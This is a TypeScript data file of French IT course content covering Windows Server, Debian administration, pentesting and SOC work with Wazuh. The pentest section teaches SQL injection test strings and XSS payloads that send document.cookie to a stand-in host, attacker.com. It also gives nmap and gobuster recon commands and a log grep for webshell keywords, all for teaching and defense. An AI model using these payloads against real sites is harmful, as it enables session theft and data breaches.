export interface CourseSection {
  title: string;
  content: string;
  code?: { lang: string; code: string };
  tip?: string;
}

export interface CourseContent {
  slug: string;
  intro: string;
  sections: CourseSection[];
}

export const courseContents: Record<string, CourseContent> = {
  "administration-windows-server": {
    slug: "administration-windows-server",
    intro: "Windows Server 2022 est le système d'exploitation serveur de Microsoft. Il est au cœur de la quasi-totalité des infrastructures d'entreprise en France. Ce cours vous prépare à administrer un domaine Active Directory complet, gérer les politiques de groupe, configurer les services réseau DHCP et DNS.",
    sections: [
      {
        title: "1. Introduction à Windows Server 2022",
        content: `Windows Server 2022 est la dernière version LTS (Long Term Servicing) de Microsoft, sortie en 2021. Elle apporte des améliorations majeures en sécurité (Secured-core server), en connectivité (SMB over QUIC) et en conteneurs (intégration Kubernetes).\n\n**Éditions disponibles** :\n- **Standard** : pour les environnements physiques ou peu virtualisés (2 VM incluses)\n- **Datacenter** : VM illimitées, fonctionnalités avancées (Storage Spaces Direct, SDN)\n- **Essentials** : TPE/PME jusqu'à 25 utilisateurs\n\n**Rôles principaux** : AD DS, DNS, DHCP, File Server, IIS, Hyper-V, Remote Desktop Services, Certificate Authority.\n\n**Méthodes d'installation** :\n- **Desktop Experience** (GUI complète) : recommandée en apprentissage\n- **Server Core** (ligne de commande) : recommandée en production (surface d'attaque réduite, moins de mises à jour)`,
        code: {
          lang: "powershell",
          code: `# Vérifier la version et l'édition installée
Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, CsProcessors

# Configurer le nom du serveur et l'IP statique
Rename-Computer -NewName "SRV-DC01" -Restart

# Configurer l'adresse IP statique (interface index 1)
New-NetIPAddress -InterfaceIndex 1 -IPAddress 192.168.1.10 -PrefixLength 24 -DefaultGateway 192.168.1.1
Set-DnsClientServerAddress -InterfaceIndex 1 -ServerAddresses 192.168.1.10

# Activer le Bureau à distance (RDP)
Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`,
        },
        tip: "Installez toujours Windows Server en Server Core en production. La surface d'attaque est réduite de 40% et les mises à jour sont moins fréquentes.",
      },
      {
        title: "2. Active Directory — Concepts et déploiement",
        content: `Active Directory (AD DS) est un service d'annuaire qui centralise l'authentification et l'autorisation dans un réseau Windows.\n\n**Domaine** : unité d'administration de base. Tous les objets (utilisateurs, ordinateurs, groupes) appartiennent à un domaine.\n\n**Unité d'organisation (OU)** : conteneur permettant de déléguer l'administration et d'appliquer des GPO de manière ciblée.\n\n**Forêt** : ensemble de domaines partageant le même schéma AD. C'est la frontière de sécurité absolue.\n\n**Catalogue global** : index de tous les objets de la forêt, indispensable pour les recherches multi-domaines et l'authentification Exchange.`,
        code: {
          lang: "powershell",
          code: `# Installer le rôle AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promouvoir le serveur en contrôleur de domaine
Install-ADDSForest \`
  -DomainName "entreprise.local" \`
  -DomainNetbiosName "ENTREPRISE" \`
  -ForestMode "WinThreshold" \`
  -DomainMode "WinThreshold" \`
  -InstallDns \`
  -Force`,
        },
        tip: "Déployez toujours minimum 2 contrôleurs de domaine. Un seul DC = point de défaillance unique qui bloque tout le réseau.",
      },
      {
        title: "3. Gestion des utilisateurs et groupes",
        content: `La gestion des comptes est le quotidien de l'administrateur AD. Comprendre les types de groupes et les étendues est fondamental.\n\n**Types de groupes** :\n- **Sécurité** : pour les autorisations d'accès aux ressources\n- **Distribution** : pour les listes de diffusion email (Exchange)\n\n**Étendues de groupes** :\n- **Local de domaine** : membres de n'importe quel domaine, ressources du domaine local\n- **Global** : membres du même domaine, ressources de toute la forêt\n- **Universel** : membres de toute la forêt, ressources de toute la forêt\n\n**Bonne pratique AGDLP** : Accounts → Global groups → Domain Local groups → Permissions`,
        code: {
          lang: "powershell",
          code: `# Créer un utilisateur
New-ADUser -Name "Jean Dupont" \`
  -GivenName "Jean" -Surname "Dupont" \`
  -SamAccountName "jdupont" \`
  -UserPrincipalName "jdupont@entreprise.local" \`
  -Path "OU=Comptabilité,DC=entreprise,DC=local" \`
  -AccountPassword (Read-Host -AsSecureString "Mot de passe") \`
  -Enabled $true

# Créer un groupe de sécurité global
New-ADGroup -Name "GRP-Comptabilite" \`
  -GroupScope Global -GroupCategory Security \`
  -Path "OU=Groupes,DC=entreprise,DC=local"

# Ajouter un utilisateur au groupe
Add-ADGroupMember -Identity "GRP-Comptabilite" -Members "jdupont"

# Lister tous les membres d'un groupe
Get-ADGroupMember -Identity "GRP-Comptabilite" | Select Name, SamAccountName`,
        },
      },
      {
        title: "4. Stratégies de groupe (GPO)",
        content: `Les GPO (Group Policy Objects) permettent d'appliquer des paramètres de configuration à des utilisateurs ou des ordinateurs de manière centralisée. L'ordre d'application est : **Local → Site → Domaine → OU** (mémorisez LSDOU).\n\n**Héritages et blocages** : une GPO enfant hérite des GPO parentes. Vous pouvez bloquer l'héritage sur une OU ou forcer l'application avec "Appliqué".\n\n**Filtrage de sécurité** : une GPO ne s'applique qu'aux objets ayant les permissions "Lecture" et "Appliquer la stratégie de groupe".`,
        code: {
          lang: "powershell",
          code: `# Créer une nouvelle GPO
New-GPO -Name "Politique-Securite-Postes"

# Lier la GPO à une OU
New-GPLink -Name "Politique-Securite-Postes" -Target "OU=Postes,DC=entreprise,DC=local"

# Forcer la mise à jour sur tous les postes
Invoke-GPUpdate -Computer "PC-Comptabilite" -Force -RandomDelayInMinutes 0

# Générer un rapport HTML de résultante des stratégies
Get-GPResultantSetOfPolicy -ReportType Html -Path "C:\\rapport-rsop.html"`,
        },
        tip: "Utilisez gpresult /H rapport.html pour diagnostiquer quelles GPO s'appliquent réellement à un utilisateur ou machine.",
      },
      {
        title: "5. Configuration DNS",
        content: `Dans un domaine AD, le DNS est critique. Il résout les noms d'hôtes en adresses IP et localise les services AD via les enregistrements SRV.\n\n**Types d'enregistrements essentiels** :\n- **A** : nom → IPv4\n- **AAAA** : nom → IPv6\n- **CNAME** : alias\n- **MX** : serveur de messagerie\n- **SRV** : localisation de services (LDAP, Kerberos)\n- **PTR** : résolution inverse\n\n**Zones DNS** :\n- **Principale** : zone de référence, modifiable\n- **Secondaire** : copie en lecture seule (transfert de zone)\n- **Stub** : contient uniquement les enregistrements NS\n- **Intégrée à l'AD** : réplication automatique entre tous les DC`,
        code: {
          lang: "powershell",
          code: `# Vérifier l'état du service DNS
Get-Service DNS | Select Status, StartType

# Ajouter un enregistrement A
Add-DnsServerResourceRecordA -Name "serveur-web" \`
  -ZoneName "entreprise.local" -IPv4Address "192.168.1.20"

# Ajouter un enregistrement CNAME (alias)
Add-DnsServerResourceRecordCName -Name "www" \`
  -ZoneName "entreprise.local" -HostNameAlias "serveur-web.entreprise.local"

# Tester la résolution DNS
Resolve-DnsName "serveur-web.entreprise.local"
nslookup -type=SRV _ldap._tcp.entreprise.local`,
        },
      },
      {
        title: "6. Configuration DHCP",
        content: `Le DHCP distribue automatiquement les paramètres réseau. Une mauvaise configuration DHCP bloque tous les postes du réseau — c'est un service critique.\n\n**Étendue (scope)** : plage d'adresses IP attribuables pour un sous-réseau.\n\n**Exclusions** : adresses réservées aux équipements à IP fixe (serveurs, imprimantes) à l'intérieur de la plage.\n\n**Réservations** : adresse IP fixe attribuée toujours au même équipement via son adresse MAC.\n\n**Options DHCP** par ordre de priorité : serveur, étendue, classe, client.`,
        code: {
          lang: "powershell",
          code: `# Installer DHCP
Install-WindowsFeature DHCP -IncludeManagementTools

# Autoriser le serveur DHCP dans l'AD
Add-DhcpServerInDC -DnsName "SRV-DC01.entreprise.local" -IPAddress 192.168.1.10

# Créer une étendue
Add-DhcpServerv4Scope -Name "LAN-Principal" \`
  -StartRange 192.168.1.100 -EndRange 192.168.1.200 \`
  -SubnetMask 255.255.255.0 -State Active

# Options de l'étendue (passerelle + DNS)
Set-DhcpServerv4OptionValue -ScopeId 192.168.1.0 \`
  -Router 192.168.1.1 -DnsServer 192.168.1.10

# Créer une exclusion (imprimante à IP fixe dans la plage)
Add-DhcpServerv4ExclusionRange -ScopeId 192.168.1.0 \`
  -StartRange 192.168.1.100 -EndRange 192.168.1.110`,
        },
        tip: "Configurez toujours le DHCP Failover entre 2 serveurs DHCP pour la haute disponibilité. Un seul serveur DHCP = coupure réseau garantie en cas de panne.",
      },
      {
        title: "7. Partages de fichiers et NTFS",
        content: `La gestion des accès aux fichiers repose sur deux niveaux de permissions combinés : **permissions de partage** (réseau) et **permissions NTFS** (système de fichiers). La permission effective est la plus restrictive des deux.\n\n**Permissions NTFS** (du moins au plus permissif) : Lecture, Lecture et exécution, Liste du contenu, Modification, Contrôle total.\n\n**Permissions de partage** : Lecture, Modification, Contrôle total.\n\n**Bonne pratique** : donner Contrôle total au niveau du partage et gérer finement les droits via NTFS uniquement.`,
        code: {
          lang: "powershell",
          code: `# Créer un dossier partagé
New-Item -Path "C:\\Partages\\Commun" -ItemType Directory
New-SmbShare -Name "Commun" -Path "C:\\Partages\\Commun" \`
  -FullAccess "Administrateurs" \`
  -ChangeAccess "GRP-Employes" \`
  -ReadAccess "Tout le monde"

# Modifier les permissions NTFS
$acl = Get-Acl "C:\\Partages\\Commun"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
  "GRP-Employes", "Modify", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl "C:\\Partages\\Commun" $acl

# Vérifier les partages actifs
Get-SmbShare | Where-Object {$_.Name -notlike "*$"}`,
        },
      },
      {
        title: "8. Surveillance et journaux d'événements",
        content: `L'Observateur d'événements Windows (Event Viewer) centralise tous les journaux système. En entreprise, ces journaux sont centralisés vers un SIEM.\n\n**Journaux essentiels** :\n- **Sécurité** : connexions, échecs d'auth, modifications de comptes → audit obligatoire\n- **Système** : erreurs matérielles et OS\n- **Application** : erreurs applicatives\n- **DNS Server / DFS / DHCP** : journaux des rôles\n\n**IDs d'événements clés** : 4624 (connexion réussie), 4625 (échec), 4720 (compte créé), 4740 (compte verrouillé), 7045 (nouveau service).`,
        code: {
          lang: "powershell",
          code: `# Consulter les 20 dernières erreurs système
Get-EventLog -LogName System -EntryType Error -Newest 20 | Select TimeGenerated, Source, Message

# Chercher les échecs de connexion (brute-force)
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4625} | \`
  Select TimeCreated, @{n="Compte";e={$_.Properties[5].Value}}, \`
  @{n="IP Source";e={$_.Properties[19].Value}} | Select -First 20

# Exporter les logs de sécurité vers CSV
Get-WinEvent -LogName Security -MaxEvents 1000 | \`
  Export-Csv "C:\\Logs\\securite-$(Get-Date -f yyyyMMdd).csv" -NoTypeInformation

# Activer l'audit des connexions (via GPO ou commande)
auditpol /set /subcategory:"Logon" /success:enable /failure:enable`,
        },
      },
      {
        title: "9. Sauvegarde avec Windows Server Backup",
        content: `La sauvegarde est une obligation légale dans de nombreux secteurs et une nécessité absolue en production. Windows Server Backup (WSB) est l'outil natif de Microsoft.\n\n**Types de sauvegardes** :\n- **Complète** : tout le système, longue mais autonome\n- **Incrémentielle** : uniquement les changements depuis la dernière sauvegarde\n- **Différentielle** : changements depuis la dernière sauvegarde complète\n\n**Règle du 3-2-1** : 3 copies, 2 supports différents, 1 hors-site.\n\n**Sauvegarde AD** : utilisez la fonctionnalité "System State" pour sauvegarder AD DS. Une sauvegarde système seule ne suffit pas pour restaurer un DC.`,
        code: {
          lang: "powershell",
          code: `# Installer la fonctionnalité Windows Server Backup
Install-WindowsFeature Windows-Server-Backup

# Sauvegarde complète vers un disque externe (D:)
$policy = New-WBPolicy
$fileSpec = New-WBFileSpec -FileSpec "C:\\"
Add-WBFileSpec -Policy $policy -FileSpec $fileSpec
Set-WBVssBackupOption -Policy $policy -VssFull
$backupLocation = New-WBBackupTarget -VolumePath "D:\\"
Add-WBBackupTarget -Policy $policy -Target $backupLocation
Start-WBBackup -Policy $policy

# Vérifier l'historique des sauvegardes
Get-WBSummary

# Planifier une sauvegarde quotidienne à 2h du matin
Set-WBSchedule -Policy $policy -Schedule 02:00`,
        },
        tip: "Testez votre plan de restauration au moins une fois par trimestre dans un environnement isolé. Une sauvegarde non testée n'est pas une sauvegarde.",
      },
      {
        title: "10. Sécurisation du contrôleur de domaine",
        content: `Le contrôleur de domaine est la cible n°1 des attaquants dans un réseau Windows. Le compromettre = compromission totale de l'entreprise (Pass-the-Hash, Golden Ticket, DCSync).\n\n**Mesures de sécurisation** :\n1. **Tiering model** : comptes Admin de niveaux 0/1/2 séparés (ne jamais utiliser un compte admin du domaine pour surfer sur Internet)\n2. **Protected Users** : groupe AD qui désactive NTLM, Kerberos DES/RC4, mise en cache des credentials\n3. **Credential Guard** : isole les secrets LSASS dans une VM sécurisée\n4. **LAPS** : génère des mots de passe administrateurs locaux uniques et aléatoires\n5. **Fine-Grained Password Policy** : politiques de mots de passe différentes selon les OU`,
        code: {
          lang: "powershell",
          code: `# Activer Protected Users pour les comptes sensibles
Add-ADGroupMember -Identity "Protected Users" -Members "Administrateur","svc-backup"

# Installer et configurer LAPS (Local Admin Password Solution)
# Prérequis : LAPS installé sur les clients via GPO
Install-Module -Name LAPS -Force
Update-LapsADSchema
Set-LapsADComputerSelfPermission -Identity "OU=Postes,DC=entreprise,DC=local"

# Voir le mot de passe LAPS d'un poste
Get-LapsADPassword -Identity "PC-COMPTA01" -AsPlainText

# Vérifier les membres du groupe Admins du domaine (surveillance)
Get-ADGroupMember "Domain Admins" | Select Name, SamAccountName`,
        },
        tip: "Le compte Administrateur intégré (RID 500) ne peut pas être verrouillé par les politiques de mots de passe. Désactivez-le et créez un compte admin avec un nom différent.",
      },
      {
        title: "11. TP — Infrastructure complète",
        content: `**Objectif du TP** : déployer une infrastructure Windows Server 2022 complète et fonctionnelle.\n\n**Scénario** : vous êtes l'administrateur réseau de la société "TechFormation SAS" (50 utilisateurs répartis en 4 services : Direction, RH, Informatique, Commercial).\n\n**Étapes à réaliser** :\n1. Installer Windows Server 2022 en VM (8 Go RAM, 80 Go disque)\n2. Configurer l'IP statique et renommer le serveur SRV-DC01\n3. Installer et promouvoir en DC du domaine techformation.local\n4. Créer l'arborescence d'OU : Direction, RH, Informatique, Commercial, Postes, Groupes\n5. Créer 12 utilisateurs (3 par service) avec des mots de passe conformes\n6. Créer les groupes de sécurité globaux par service\n7. Configurer DHCP (plage 192.168.10.100-200) avec exclusion .100-.110\n8. Créer 3 GPO : fond d'écran unifié, désactivation des clés USB, mappage de lecteur réseau\n9. Créer un partage \\\\SRV-DC01\\Commun avec droits par groupe\n10. Tester avec un poste client Windows 10 joint au domaine`,
        tip: "Créez un snapshot de votre VM après chaque étape réussie. En cas d'erreur, vous pouvez revenir à l'état précédent sans tout recommencer.",
      },
      {
        title: "12. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours Windows Server 2022. Le QCM couvre tous les modules : AD DS, GPO, DNS, DHCP, partages, sécurité.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge TSSR-Windows.`,
      },
    ],
  },
  "linux-debian-admin": {
    slug: "linux-debian-admin",
    intro: "Linux Debian/Ubuntu Server est le système d'exploitation open-source incontournable pour les serveurs en entreprise. Ce cours vous forme à l'administration système complète : gestion des utilisateurs, services, sécurité SSH, firewall et automatisation par scripts Bash.",
    sections: [
      {
        title: "1. Installation et premiers pas",
        content: `Debian est une distribution GNU/Linux stable et fiable, base de nombreuses distributions (Ubuntu, Mint, Kali). Pour un serveur, choisissez toujours l'installation **minimale** sans interface graphique.\n\n**Partitionnement recommandé** :\n- /boot : 512 Mo (ext4)\n- / : 20 Go (ext4)\n- /var : 10 Go (ext4, pour les logs)\n- /home : reste (ext4)\n- swap : 2x RAM (jusqu'à 8 Go)\n\n**Après installation** : mettez à jour le système, configurez sudo, définissez une IP statique dans /etc/network/interfaces.`,
        code: {
          lang: "bash",
          code: `# Mise à jour du système
apt update && apt upgrade -y

# Installer sudo et ajouter l'utilisateur
apt install sudo
usermod -aG sudo votre_utilisateur

# Configurer une IP statique (/etc/network/interfaces)
auto eth0
iface eth0 inet static
  address 192.168.1.20
  netmask 255.255.255.0
  gateway 192.168.1.1
  dns-nameservers 8.8.8.8 1.1.1.1`,
        },
        tip: "Installez toujours le paquet 'openssh-server' lors de l'installation pour pouvoir administrer le serveur à distance dès le premier boot.",
      },
      {
        title: "2. Système de fichiers et permissions",
        content: `Linux repose sur une architecture en couches : **noyau (kernel)**, bibliothèques système, shell, applications.\n\n**Hiérarchie du système de fichiers (FHS)** :\n- **/etc** : fichiers de configuration\n- **/var** : données variables (logs, bases de données)\n- **/home** : répertoires utilisateurs\n- **/usr** : programmes et bibliothèques\n- **/tmp** : fichiers temporaires\n- **/proc** : pseudo-filesystem (état du noyau en temps réel)\n- **/sys** : interface avec le matériel\n\n**Permissions** : chaque fichier a un propriétaire (user), un groupe (group) et des droits pour les autres (others). Format octal : 755 = rwxr-xr-x.`,
        code: {
          lang: "bash",
          code: `# Afficher les permissions détaillées
ls -la /etc/passwd

# Modifier les permissions (chmod)
chmod 750 /opt/script.sh        # rwxr-x---
chmod u+x,g-w fichier.sh        # notation symbolique

# Changer propriétaire et groupe
chown www-data:www-data /var/www/html

# Commandes essentielles de navigation
pwd && ls -lah && find /etc -name "*.conf" -type f 2>/dev/null | head -20`,
        },
        tip: "Mémorisez : 4=lecture, 2=écriture, 1=exécution. 7=tout, 5=lecture+exécution, 4=lecture seule. Ex: 644 = rw-r--r-- (fichier config standard).",
      },
      {
        title: "2. Gestion des services avec systemd",
        content: `**systemd** est le système d'initialisation standard depuis Debian 8 / Ubuntu 15.04. Il remplace SysV init et gère le démarrage, les services, les logs (journald) et les montages.\n\nUn **unit systemd** est décrit par un fichier .service dans /etc/systemd/system/. Il définit comment démarrer, arrêter et surveiller un service.\n\n**Types d'unités** : service, socket, timer, target, mount, path...`,
        code: {
          lang: "bash",
          code: `# Gestion des services (nginx en exemple)
systemctl start nginx       # démarrer
systemctl stop nginx        # arrêter
systemctl restart nginx     # redémarrer
systemctl reload nginx      # recharger config sans coupure
systemctl enable nginx      # activer au démarrage
systemctl status nginx      # état détaillé

# Créer un service personnalisé
cat > /etc/systemd/system/mon-app.service << 'EOF'
[Unit]
Description=Mon Application Web
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/mon-app
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload && systemctl enable --now mon-app`,
        },
      },
      {
        title: "3. Sécurisation SSH",
        content: `SSH (Secure Shell) est le protocole standard pour administrer les serveurs Linux à distance. Par défaut, il écoute sur le port 22 et accepte l'authentification par mot de passe — deux failles majeures à corriger en production.\n\n**Bonnes pratiques obligatoires** :\n1. Authentification par clé uniquement (désactiver les mots de passe)\n2. Désactiver la connexion root directe\n3. Changer le port par défaut (obscurcissement)\n4. Limiter les utilisateurs autorisés\n5. Configurer fail2ban contre le brute-force`,
        code: {
          lang: "bash",
          code: `# Générer une paire de clés SSH (sur votre poste client)
ssh-keygen -t ed25519 -C "admin@entreprise.fr" -f ~/.ssh/id_ed25519

# Copier la clé publique sur le serveur
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.1.50

# Sécuriser /etc/ssh/sshd_config
sudo nano /etc/ssh/sshd_config
# Modifier ces lignes :
# Port 2222
# PermitRootLogin no
# PasswordAuthentication no
# AllowUsers adminprod deployer
# MaxAuthTries 3

# Installer et configurer fail2ban
apt install fail2ban -y
systemctl enable --now fail2ban
fail2ban-client status sshd`,
        },
        tip: "Testez toujours la nouvelle configuration SSH dans un second terminal AVANT de fermer votre session actuelle. Une erreur dans sshd_config peut vous couper du serveur.",
      },
      {
        title: "4. Scripts Bash — Automatisation",
        content: `Bash est le shell par défaut sur la majorité des distributions Linux. L'automatisation via scripts est une compétence clé de l'administrateur système.\n\n**Éléments essentiels d'un script Bash** : shebang, variables, conditions, boucles, fonctions, gestion des erreurs avec codes de retour.`,
        code: {
          lang: "bash",
          code: `#!/bin/bash
# Script de sauvegarde automatique
set -euo pipefail  # arrêt si erreur, variable non définie, pipe échoué

BACKUP_DIR="/var/backups/$(date +%Y-%m-%d)"
SOURCE_DIR="/var/www"
RETENTION_DAYS=30

log() { echo "[$(date '+%H:%M:%S')] $*"; }

log "Démarrage sauvegarde..."
mkdir -p "$BACKUP_DIR"

# Compresser et archiver
tar -czf "$BACKUP_DIR/www-backup.tar.gz" "$SOURCE_DIR" 2>/dev/null
log "Archive créée : $BACKUP_DIR/www-backup.tar.gz ($(du -sh "$BACKUP_DIR/www-backup.tar.gz" | cut -f1))"

# Supprimer les sauvegardes plus vieilles que RETENTION_DAYS
find /var/backups -type d -mtime +$RETENTION_DAYS -exec rm -rf {} + 2>/dev/null || true
log "Nettoyage terminé. Rétention : $RETENTION_DAYS jours"`,
        },
      },
    ],
  },

  "securite-offensive-pentest": {
    slug: "securite-offensive-pentest",
    intro: "Le test d'intrusion (pentest) est une démarche légale et encadrée visant à identifier les vulnérabilités d'un système AVANT qu'un attaquant malveillant ne le fasse. Ce cours couvre la méthodologie complète d'un pentest professionnel, les outils du testeur et les vulnérabilités web les plus courantes selon l'OWASP.",
    sections: [
      {
        title: "1. Méthodologie d'un pentest professionnel",
        content: `Un pentest se déroule en 5 phases distinctes. **Sans mandat écrit signé, toute intrusion est illégale** (art. 323-1 du Code pénal).\n\n**Phase 1 — Reconnaissance (OSINT)** : collecte d'informations publiques sur la cible (DNS, WHOIS, réseaux sociaux, job offers, Google Dork).\n\n**Phase 2 — Scan et énumération** : identification des ports ouverts, services, versions logicielles, utilisateurs.\n\n**Phase 3 — Exploitation** : utilisation des vulnérabilités identifiées pour obtenir un accès.\n\n**Phase 4 — Post-exploitation** : élévation de privilèges, persistance, mouvement latéral, exfiltration de données.\n\n**Phase 5 — Rapport** : documentation de toutes les vulnérabilités avec leur criticité (CVSS) et les recommandations de remédiation.`,
        code: {
          lang: "bash",
          code: `# Phase de reconnaissance — collecte OSINT
# Résolution DNS complète
nslookup -type=any cible.fr
dig cible.fr ANY +noall +answer

# Scan de ports (Nmap)
nmap -sV -sC -O -p- --min-rate 5000 -oA scan-cible 192.168.1.0/24
# -sV : détection de version  -sC : scripts par défaut
# -O  : détection OS          -p- : tous les ports

# Enumération web
gobuster dir -u http://cible.fr -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`,
        },
        tip: "⚠️ Ces techniques ne s'utilisent QUE sur des systèmes pour lesquels vous avez une autorisation écrite. En CTF, sur votre lab perso ou dans le cadre d'une mission de pentest signée.",
      },
      {
        title: "2. OWASP Top 10 — Injection SQL",
        content: `L'injection SQL est la vulnérabilité web n°1 depuis des années. Elle survient quand des données utilisateur sont directement interpolées dans une requête SQL sans validation ni préparation.\n\n**Conséquences** : extraction de la base de données entière, contournement d'authentification, modification de données, exécution de commandes OS (xp_cmdshell sur SQL Server).\n\n**Détection** : cherchez les paramètres GET/POST injectés dans des requêtes (id=1, user=admin, search=...). Testez avec une apostrophe : si erreur SQL → potentiellement vulnérable.\n\n**Prévention** : requêtes préparées (PreparedStatement), ORM, validation stricte des entrées, principe du moindre privilège sur le compte SQL.`,
        code: {
          lang: "sql",
          code: `-- Exemple de code VULNÉRABLE (NE PAS FAIRE)
-- $query = "SELECT * FROM users WHERE id=" . $_GET['id'];

-- Test basique d'injection
-- URL: /article.php?id=1'   → erreur SQL si vulnérable
-- URL: /article.php?id=1 OR 1=1--   → retourne tous les enregistrements

-- Extraction de la structure (SQLMap automatise ceci)
-- /article.php?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables--

-- CODE SÉCURISÉ avec requête préparée (PHP PDO)
-- $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
-- $stmt->execute([$_GET['id']]);`,
        },
      },
      {
        title: "3. OWASP Top 10 — XSS et CSRF",
        content: `**XSS (Cross-Site Scripting)** : injection de code JavaScript malveillant dans une page web. Permet le vol de cookies/tokens de session, la redirection vers des sites de phishing, ou le keylogging.\n\n- **XSS Réfléchi** : le payload est dans l'URL, exécuté une seule fois\n- **XSS Stocké** : le payload est sauvegardé en BDD, affecte tous les visiteurs\n- **XSS DOM** : manipulation directe du DOM côté client\n\n**CSRF (Cross-Site Request Forgery)** : forcer un utilisateur authentifié à effectuer une action à son insu (virement bancaire, changement d'email...).\n\n**Prévention XSS** : encoder toutes les sorties HTML, utiliser une CSP stricte, HttpOnly sur les cookies. **Prévention CSRF** : token CSRF unique par formulaire, SameSite=Strict sur les cookies.`,
        code: {
          lang: "javascript",
          code: `// Payload XSS basique (test en lab uniquement)
<script>alert('XSS')</script>
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

// Payload XSS avancé — vol de session
<script>
  var i = new Image();
  i.src = "https://attacker.com/log?session=" + document.cookie;
</script>

// PROTECTION côté serveur (Node.js/Express)
const helmet = require('helmet');
app.use(helmet());  // Headers de sécurité dont CSP

// Encodage des sorties (ne jamais insérer des données brutes dans le DOM)
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(userInput);`,
        },
        tip: "En pentest web, utilisez toujours Burp Suite pour intercepter et modifier les requêtes HTTP. C'est l'outil indispensable du testeur web.",
      },
      {
        title: "4. Rédiger un rapport de pentest",
        content: `Un rapport de pentest professionnel comporte obligatoirement :\n\n**1. Résumé exécutif** (2 pages max) : destiné à la direction, sans jargon technique. Synthèse du niveau de sécurité global, risques majeurs, priorités de remédiation.\n\n**2. Résumé technique** : périmètre testé, dates, méthodologie utilisée (OWASP Testing Guide, PTES...), outils employés.\n\n**3. Vulnérabilités détaillées** pour chaque finding :\n- Titre et criticité (Critique/Élevée/Moyenne/Faible) avec score CVSS v3\n- Description technique\n- Preuve (screenshot, log, payload)\n- Impact si exploitée\n- Recommandation de remédiation précise\n\n**4. Annexes** : logs des scans, commandes exécutées, timeline.`,
        tip: "Classez vos vulnérabilités par score CVSS (Common Vulnerability Scoring System). Un score ≥9.0 = Critique, 7-8.9 = Élevé, 4-6.9 = Moyen, <4 = Faible.",
      },
    ],
  },

  "soc-siem-blue-team": {
    slug: "soc-siem-blue-team",
    intro: "Le SOC (Security Operations Center) est le centre névralgique de la défense cybernétique d'une organisation. Les analystes SOC surveillent en permanence les systèmes pour détecter, analyser et répondre aux incidents de sécurité. Ce cours vous prépare aux métiers de la Blue Team : analyste SOC N1/N2, ingénieur SIEM, répondant aux incidents.",
    sections: [
      {
        title: "1. Architecture d'un SOC",
        content: `Un SOC s'organise en niveaux (tiers) de compétences :\n\n**N1 — Analyste de surveillance** : monitoring en temps réel, triage des alertes, qualification basique (faux positif ou vrai incident ?), escalade vers N2.\n\n**N2 — Analyste d'investigation** : analyse approfondie des incidents, threat hunting, forensics basique, rédaction de rapports d'incident.\n\n**N3 — Expert / Threat Hunter** : reverse engineering, analyse de malwares, règles de détection avancées, réponse aux incidents majeurs (APT).\n\n**Outils piliers d'un SOC** :\n- **SIEM** : collecte et corrélation des logs (Splunk, Wazuh, IBM QRadar)\n- **EDR** : protection endpoint (CrowdStrike, SentinelOne, Defender)\n- **SOAR** : automatisation de la réponse\n- **Threat Intelligence** : IOCs, TTPs des attaquants (MITRE ATT&CK)`,
        tip: "Le framework MITRE ATT&CK est la référence mondiale pour classifier les techniques d'attaque. Apprenez à naviguer sur attack.mitre.org — c'est utilisé dans tous les SOC professionnels.",
      },
      {
        title: "2. Déploiement de Wazuh SIEM",
        content: `**Wazuh** est un SIEM/XDR open-source très utilisé en France (recommandé par l'ANSSI pour les PME). Il se compose d'un **manager** (serveur central), d'**agents** (déployés sur chaque machine à surveiller) et d'un **dashboard** (interface Kibana/OpenSearch).\n\n**Capacités de Wazuh** :\n- Collecte de logs (Syslog, Windows Event Logs, fichiers applicatifs)\n- Détection d'intrusions (règles YARA, Sigma)\n- Vérification d'intégrité des fichiers (FIM)\n- Conformité réglementaire (PCI-DSS, GDPR, HIPAA)\n- Vulnerability assessment`,
        code: {
          lang: "bash",
          code: `# Installation Wazuh Manager (sur Ubuntu 22.04)
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
bash wazuh-install.sh -a  # Installation tout-en-un

# Déployer un agent sur un serveur Linux à surveiller
# Sur le serveur Wazuh manager, générer la commande d'enrôlement :
# Wazuh Dashboard → Agents → Deploy new agent

# Exemple de commande générée (à exécuter sur l'agent)
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.0-1_amd64.deb
WAZUH_MANAGER='192.168.1.20' dpkg -i ./wazuh-agent_4.7.0-1_amd64.deb
systemctl enable --now wazuh-agent`,
        },
      },
      {
        title: "3. Analyse de logs et détection",
        content: `L'analyste SOC passe 70% de son temps à analyser des logs. Il faut savoir identifier rapidement les événements anormaux parmi des millions de lignes.\n\n**Logs Windows essentiels** (Event Viewer) :\n- **ID 4624** : connexion réussie\n- **ID 4625** : échec de connexion (brute-force !)\n- **ID 4648** : connexion avec credentials explicites (Pass-the-Hash)\n- **ID 4688** : création de processus\n- **ID 4698** : création de tâche planifiée (persistence !)\n- **ID 7045** : nouveau service installé\n\n**Logs Linux essentiels** :\n- /var/log/auth.log : authentifications SSH, sudo\n- /var/log/syslog : messages système généraux\n- journalctl -u nginx : logs d'un service spécifique`,
        code: {
          lang: "bash",
          code: `# Détecter des tentatives de brute-force SSH dans les logs
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Identifier les connexions SSH réussies depuis des IP inhabituelles
grep "Accepted" /var/log/auth.log | awk '{print $11, $9}' | sort | uniq -c

# Recherche de webshells dans les logs Apache
grep -E "(cmd|exec|system|passthru|shell_exec)" /var/log/apache2/access.log

